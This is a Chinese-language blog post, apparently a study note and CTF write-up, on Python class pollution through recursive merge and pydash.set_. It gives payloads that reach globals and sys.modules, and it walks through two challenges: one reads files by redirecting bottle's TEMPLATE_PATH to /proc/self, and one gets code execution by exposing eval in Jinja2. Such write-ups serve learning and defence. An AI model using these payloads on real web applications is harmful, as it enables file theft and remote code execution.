<h1 id="污染方法"><a href="#污染方法" class="headerlink" title="污染方法"></a>污染方法</h1><h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><h3 id="merge函数"><a href="#merge函数" class="headerlink" title="merge函数"></a>merge函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items(): <span class="comment">#遍历src的item属性，键为k，值为v</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):  <span class="comment">#检查dst对象是否有__getitem__属性，如果存在则可以将dst作为字典访问</span></span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:  <span class="comment">#如果dst也有k键且v是字典</span></span><br><span class="line">                merge(v, dst.get(k)) <span class="comment">#递归合并</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v <span class="comment">#其他情况把dst的k键赋值为v</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>: <span class="comment">#如果目标对象中已经存在该属性则只复制值</span></span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v) <span class="comment">#如果dst没有k属性，那就添加k属性且值为v</span></span><br></pre></td></tr></table></figure>

<h3 id="pydash"><a href="#pydash" class="headerlink" title="pydash"></a>pydash</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name] <span class="comment">#某全局变量</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="污染有继承关系属性"><a href="#污染有继承关系属性" class="headerlink" title="污染有继承关系属性"></a>污染有继承关系属性</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;haha&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>): <span class="comment">#使用 (father) 声明继承关系</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>): <span class="comment">#使用 (father) 声明继承关系</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = son_a()</span><br><span class="line"><span class="comment">#自定义属性</span></span><br><span class="line">payload1 = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;no way&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#内置属性同理</span></span><br><span class="line">payload2 = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123; <span class="comment">#通过base找到父类进行污染</span></span><br><span class="line">            <span class="string">&quot;__str__&quot;</span> : <span class="string">&quot;Polluted~&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(son_a.secret) <span class="comment">#子类会继承父类属性</span></span><br><span class="line"><span class="comment">#haha</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret) <span class="comment">#实例子类会继承父类属性</span></span><br><span class="line"><span class="comment">#haha</span></span><br><span class="line">merge(payload1, instance) <span class="comment">#污染父类子类也会受影响</span></span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#no way</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#no way</span></span><br><span class="line">merge(payload2, instance)</span><br><span class="line"><span class="built_in">print</span>(father.__str__)</span><br><span class="line"><span class="comment">#Polluted~</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#并非所有类属性都能被污染，object类就不行</span></span><br><span class="line"><span class="comment">#merge(payload2, object)</span></span><br><span class="line"><span class="comment">#TypeError: cannot set &#x27;__str__&#x27; attribute of immutable type &#x27;object&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="修改无继承关系的类属性或者全局变量"><a href="#修改无继承关系的类属性或者全局变量" class="headerlink" title="修改无继承关系的类属性或者全局变量"></a>修改无继承关系的类属性或者全局变量</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">&quot;nihao&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(father.secret)</span><br><span class="line"><span class="built_in">print</span>(str1)</span><br><span class="line">payload3 = &#123;<span class="string">&quot;__init__&quot;</span>:</span><br><span class="line">                &#123;<span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;str1&quot;</span>:<span class="number">514</span>,</span><br><span class="line">                    <span class="string">&quot;father&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;secret&quot;</span>:<span class="string">&quot;nihao&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;&#125;&#125;</span><br><span class="line">instance = b()</span><br><span class="line">merge(payload3, instance)</span><br><span class="line"><span class="built_in">print</span>(father.secret)</span><br><span class="line"><span class="built_in">print</span>(str1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#加载关系简单(import)</span></span><br><span class="line"><span class="built_in">print</span>(test.nihao)</span><br><span class="line"><span class="built_in">print</span>(test.target_class.zaijian)</span><br><span class="line">payload3 = &#123;<span class="string">&quot;__init__&quot;</span>:</span><br><span class="line">                &#123;<span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;test&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;nihao&quot;</span>: <span class="number">222</span>,</span><br><span class="line">                        <span class="string">&quot;target_class&quot;</span>:&#123;</span><br><span class="line">                            <span class="string">&quot;zaijian&quot;</span>: <span class="string">&quot;chi l&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;&#125;&#125;</span><br><span class="line">instance = b()</span><br><span class="line">merge(payload3, instance)</span><br><span class="line"><span class="built_in">print</span>(test.nihao)</span><br><span class="line"><span class="built_in">print</span>(test.target_class.zaijian)</span><br><span class="line"></span><br><span class="line"><span class="comment">#加载关系复杂（sys）</span></span><br><span class="line">payload4 = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;test&quot;</span> : &#123;</span><br><span class="line">                        <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                        <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                            <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;模块名&gt;.__loader__.__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line"><span class="comment">#对于python3来说除了在debug模式下的主文件中__loader__为None以外,正常执行的情况每个模块的__loader__属性均有一个对应的类</span></span><br><span class="line">&lt;模块名&gt;.__spec__.__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line">&lt;模块名&gt;.__spec__.loader__.__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line">&lt;模块名&gt;.__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.env</span><br></pre></td></tr></table></figure>

<h2 id="实例"><a href="#实例" class="headerlink" title="实例:"></a>实例:</h2><h3 id="NCTF-ez-dash-ez-dash-revenge"><a href="#NCTF-ez-dash-ez-dash-revenge" class="headerlink" title="[NCTF]ez_dash &amp; ez_dash_revenge"></a>[NCTF]ez_dash &amp; ez_dash_revenge</h3><ul>
<li>py类原型链污染&amp;文件读取漏洞</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">def setval(name:str, path:str, value:str)-&gt; Optional[bool]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=0: <span class="built_in">return</span> False</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="built_in">print</span>(2)</span><br><span class="line">            <span class="built_in">return</span> False</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=0:</span><br><span class="line">            <span class="built_in">print</span>(1)</span><br><span class="line">            <span class="built_in">return</span> False</span><br><span class="line">    obj=globals()[name] <span class="comment">#某全局变量</span></span><br><span class="line">    try:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">        <span class="built_in">print</span>(1)</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">return</span> False</span><br><span class="line">    <span class="built_in">return</span> True</span><br><span class="line"></span><br><span class="line">@bottle.post(<span class="string">&#x27;/setValue&#x27;</span>)</span><br><span class="line">def set_value():</span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> not isinstance(path,str):</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">if</span> len(name)&gt;6 or len(path)&gt;32:</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="built_in">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;7&quot;</span></span><br><span class="line"></span><br><span class="line">@bottle.get(<span class="string">&#x27;/render&#x27;</span>)</span><br><span class="line">def render_template():</span><br><span class="line">    <span class="built_in">print</span>(pydash.name);</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="comment">#path是文件名</span></span><br><span class="line">    <span class="keyword">if</span> path.find(<span class="string">&quot;&#123;&quot;</span>)&gt;=0 or path.find(<span class="string">&quot;&#125;&quot;</span>)&gt;=0 or path.find(<span class="string">&quot;.&quot;</span>)&gt;=0:</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">    <span class="built_in">return</span> bottle.template(path)</span><br></pre></td></tr></table></figure>

<p>&#x2F;setValue是原型链污染，&#x2F;render是渲染结果输出</p>
<p>由报错知，path是文件名（ template（）-&gt; search（））</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    第一个参数可以是模板名称、文件名或模板字符串，</span></span><br><span class="line"><span class="string">    后面的参数可以是字典或关键字参数，</span></span><br><span class="line"><span class="string">    用于模板渲染时的变量替换。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    tpl = args[<span class="number">0</span>] <span class="keyword">if</span> args <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> dictarg <span class="keyword">in</span> args[<span class="number">1</span>:]:</span><br><span class="line">    <span class="comment">#从args第二个参数开始遍历</span></span><br><span class="line">        kwargs.update(dictarg)</span><br><span class="line">        <span class="comment">#将 dictarg 的键值对合并到 kwargs 中</span></span><br><span class="line">    adapter = kwargs.pop(<span class="string">&#x27;template_adapter&#x27;</span>, SimpleTemplate)</span><br><span class="line">    <span class="comment">#选择模板引擎</span></span><br><span class="line">    lookup = kwargs.pop(<span class="string">&#x27;template_lookup&#x27;</span>, TEMPLATE_PATH)</span><br><span class="line">    <span class="comment">#设定文件目录</span></span><br><span class="line">    tplid = (<span class="built_in">id</span>(lookup), tpl)</span><br><span class="line">    <span class="comment">#缓存键</span></span><br><span class="line">    <span class="keyword">if</span> tplid <span class="keyword">not</span> <span class="keyword">in</span> TEMPLATES <span class="keyword">or</span> DEBUG:</span><br><span class="line">        settings = kwargs.pop(<span class="string">&#x27;template_settings&#x27;</span>, &#123;&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(tpl, adapter):</span><br><span class="line">            TEMPLATES[tplid] = tpl</span><br><span class="line">            <span class="keyword">if</span> settings: TEMPLATES[tplid].prepare(**settings)</span><br><span class="line">            <span class="comment">#若 tpl 是 adapter 的实例，直接缓存并调用 prepare（配置预处理）</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;\n&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&quot;%&quot;</span> <span class="keyword">in</span> tpl <span class="keyword">or</span> <span class="string">&#x27;$&#x27;</span> <span class="keyword">in</span> tpl:</span><br><span class="line">            TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)</span><br><span class="line">            <span class="comment">#若 tpl 包含换行符或特定符号（&#123;, %, $），视为模板字符串，通过 source 参数加载</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)</span><br><span class="line">            <span class="comment">#否则，视为模板名称或文件路径，通过 name 参数加载</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> TEMPLATES[tplid]:</span><br><span class="line">        abort(<span class="number">500</span>, <span class="string">&#x27;Template (%s) not found&#x27;</span> % tpl)</span><br><span class="line">        <span class="comment">#若模板加载失败（如文件不存在），调用 abort 终止并返回 HTTP 500 错误</span></span><br><span class="line">    <span class="keyword">return</span> TEMPLATES[tplid].render(kwargs)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#因为path禁用了&#123;&#125;，所以会被当成文件名在模板目录里查找使用 → 继续追踪到search函数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">cls, name, lookup=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Search name in all directories specified in lookup.</span></span><br><span class="line"><span class="string">    First without, then with common extensions. Return first hit. &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> lookup:</span><br><span class="line">        <span class="keyword">raise</span> depr(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&quot;Empty template lookup path.&quot;</span>, <span class="string">&quot;Configure a template lookup path.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.path.isabs(name):</span><br><span class="line">        <span class="keyword">raise</span> depr(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&quot;Use of absolute path for template name.&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;Refer to templates with names or paths relative to the lookup path.&quot;</span>)</span><br><span class="line"><span class="comment">#传入的是绝对路径</span></span><br><span class="line">    <span class="keyword">for</span> spath <span class="keyword">in</span> lookup:</span><br><span class="line">        spath = os.path.abspath(spath) + os.sep</span><br><span class="line">        <span class="comment"># 将搜索路径转换为绝对路径，并确保以分隔符结尾（如 &quot;/safe/dir/&quot; → &quot;/safe/dir/&quot;)</span></span><br><span class="line">        </span><br><span class="line">        fname = os.path.abspath(os.path.join(spath, name))</span><br><span class="line">        <span class="comment"># 拼接目标文件的绝对路径（如 &quot;/safe/dir/&quot; + &quot;index.html&quot; → &quot;/safe/dir/index.html&quot;）</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> fname.startswith(spath): <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 关键安全校验：确保生成的路径仍在搜索路径内（防止路径穿越）</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(fname): <span class="keyword">return</span> fname</span><br><span class="line">        <span class="comment">#检测原始文件是否存在</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> ext <span class="keyword">in</span> cls.extensions:</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(<span class="string">&#x27;%s.%s&#x27;</span> % (fname, ext)):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;%s.%s&#x27;</span> % (fname, ext)</span><br><span class="line">        <span class="comment"># 若原始文件不存在，尝试附加扩展名（如 &quot;index&quot; → &quot;index.html&quot;）</span></span><br></pre></td></tr></table></figure>

<p>通过代码审计，想到可以利用此处来读文件，但是不能直接利用目录穿越漏洞，得修改TEMPLATE_PATH，这就得利用到setval(name, path, value)了</p>
<p>即setval(bottle,TEMPLATE_PATH,”..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;“)</p>
<p>然后查看pydash.set_(obj,path,value)源码,一路追踪到helpers.base_set</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">base_set</span>(<span class="params">obj, key, value, allow_override=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Set an object&#x27;s `key` to `value`. If `obj` is a ``list`` and the `key` is the next available</span></span><br><span class="line"><span class="string">    index position, append to list; otherwise, pad the list of ``None`` and then append to the list.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj: Object to assign value to.</span></span><br><span class="line"><span class="string">        key: Key or index to assign to.</span></span><br><span class="line"><span class="string">        value: Value to assign.</span></span><br><span class="line"><span class="string">        allow_override: Whether to allow overriding a previously set key.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">dict</span>):</span><br><span class="line">        <span class="keyword">if</span> allow_override <span class="keyword">or</span> key <span class="keyword">not</span> <span class="keyword">in</span> obj:</span><br><span class="line">            obj[key] = value</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">list</span>):</span><br><span class="line">        key = <span class="built_in">int</span>(key)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key &lt; <span class="built_in">len</span>(obj):</span><br><span class="line">            <span class="keyword">if</span> allow_override:</span><br><span class="line">                obj[key] = value</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key &gt; <span class="built_in">len</span>(obj):</span><br><span class="line">                <span class="comment"># Pad list object with None values up to the index key, so we can append the value</span></span><br><span class="line">                <span class="comment"># into the key index.</span></span><br><span class="line">                obj[:] = (obj + [<span class="literal">None</span>] * key)[:key]</span><br><span class="line">            obj.append(value)</span><br><span class="line">    <span class="keyword">elif</span> (allow_override <span class="keyword">or</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(obj, key)) <span class="keyword">and</span> obj <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        _raise_if_restricted_key(key)</span><br><span class="line">        <span class="built_in">setattr</span>(obj, key, value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_raise_if_restricted_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="comment"># Prevent access to restricted keys for security reasons.</span></span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> RESTRICTED_KEYS:</span><br><span class="line">        <span class="keyword">raise</span> KeyError(<span class="string">f&quot;access to restricted key <span class="subst">&#123;key!r&#125;</span> is not allowed&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    RESTRICTED_KEYS = (<span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;__builtins__&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>可见pydash.set_对于可覆盖的值有限制,限制表为RESTRICTED_KEYS &#x3D; (“<strong>globals</strong>“, “<strong>builtins</strong>“)</p>
<p>所以我们现在要先修改RESTRICTED_KEYS,即</p>
<p>&#x2F;setValue?name&#x3D;pydash</p>
<p>{“path”:”helpers.RESTRICTED_KEYS”,”value”:[]}(空数组)</p>
<p>pydash.set_(pydash,helpers.RESTRICTED_KEYS,[])</p>
<p>(包目录下的 <code>.py</code> 文件会被视为子模块,即使__init__包里不存在引入helpers也能使用)</p>
<p>然后要通过__globals__来访问bottle模块,但是pydash模块没有__globals__,</p>
<p>在代码**末尾(!!!!!!!!!!!!!!!!!!!!!!)**添加print(globals().keys()),可得所有全局变量</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">dict_keys([<span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;Optional&#x27;</span>, <span class="string">&#x27;pydash&#x27;</span>, <span class="string">&#x27;bottle&#x27;</span>, <span class="string">&#x27;__forbidden_path__&#x27;</span>, <span class="string">&#x27;__forbidden_name__&#x27;</span>, <span class="string">&#x27;setval&#x27;</span>, <span class="string">&#x27;set_value&#x27;</span>, <span class="string">&#x27;render_template&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>发现可以利用setval函数,于是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/setValue?name=setval</span><br><span class="line"></span><br><span class="line">&#123;&quot;path&quot;:&quot;__globals__.bottle.TEMPLATE_PATH&quot;,&quot;value&quot;:[&quot;../../../proc/self/&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>就可以成功更改目录,然后再&#x2F;render传参即可</p>
<h3 id="idekctf2022-task-manager"><a href="#idekctf2022-task-manager" class="headerlink" title="[idekctf2022]task manager"></a>[idekctf2022]task manager</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#app.py</span></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">if</span> app.env == <span class="string">&#x27;yolo&#x27;</span>:</span><br><span class="line">        app.add_template_global(<span class="built_in">eval</span>)</span><br><span class="line"><span class="comment">#将 Python 函数注入到 Jinja2 模板环境，使该函数能在所有模板中直接调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#taskmanager.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TaskManager</span>:</span><br><span class="line">    protected = [<span class="string">&quot;set&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;get_all&quot;</span>, <span class="string">&quot;__init__&quot;</span>, <span class="string">&quot;complete&quot;</span>]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">self, task, status</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="variable language_">self</span>.protected)</span><br><span class="line">        <span class="keyword">if</span> task <span class="keyword">in</span> <span class="variable language_">self</span>.protected:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        pydash.set_(<span class="variable language_">self</span>, task, status)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment">#可以进行原型链污染</span></span><br></pre></td></tr></table></figure>

<p>此处可以通过原型链污染将eval添加到jinja2模板环境中,payload如下:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;task&quot;</span><span class="punctuation">:</span><span class="string">&quot;protected&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;[]&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;task&quot;</span><span class="punctuation">:</span><span class="string">&quot;__init__.__globals__.__spec__.__init__.__globals__.sys.modules.__main__.app.env&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;yolo&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;task&quot;</span><span class="punctuation">:</span><span class="string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.before_first_request&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;false&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">//让before_first_request并非执行一次,而是一直执行,设置为false就可以让eval一直呆在添加到jinja2模板环境中</span></span><br></pre></td></tr></table></figure>

<p>然后就要查找能利用eval的地方,现有模板文件是利用不上了,查找eval引用时,发现</p>
<p><img src="/../images/image-20250331223408817.png" alt="image-20250331223408817"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> value <span class="keyword">in</span> [<span class="string">&quot;True&quot;</span>, <span class="string">&quot;False&quot;</span>, <span class="string">&quot;None&quot;</span>, <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&quot;&#x27;</span>]:</span><br><span class="line">    value = <span class="built_in">eval</span>(value)</span><br><span class="line"><span class="keyword">else</span>:</span><br></pre></td></tr></table></figure>

<p>可以想办法让模板渲染此文件,并且把eval包含执行</p>
<p>通过修改闭合字符串可以做到</p>
<blockquote>
<p>block_start_string标记块开始的字符串。默认为<code>&#123;%`.
>
> block_end_string标记块结束的字符串。默认为`%&#125;</code>.</p>
<p>variable_start_string标记打印语句开始的字符串。默认为<code>&#123;&#123;`.
>
> variable_end_string标记打印语句结束的字符串。默认为 `&#125;&#125;</code>.</p>
</blockquote>
<p>因此payload如下:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;task&quot;</span><span class="punctuation">:</span><span class="string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_start_string&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\n value = &quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;task&quot;</span><span class="punctuation">:</span><span class="string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_start_string&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\n else:&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>最后绕过jinja的目录穿越实现任意文件渲染</p>
